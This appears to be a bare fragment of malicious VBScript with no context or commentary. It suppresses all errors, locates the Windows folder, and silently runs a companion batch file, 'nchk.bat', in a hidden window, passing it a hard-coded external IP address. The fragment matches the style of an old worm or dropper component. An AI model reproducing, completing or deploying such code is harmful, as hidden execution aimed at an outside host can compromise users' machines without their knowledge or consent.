on error resume next
Set fso = CreateObject("Scripting.FileSystemObject")
windows = fso.GetSpecialFolder(WindowsFolder)
Set src3 = CreateObject("Wscript.shell")
src3.run "nchk.bat 62.163.29.214",0,true
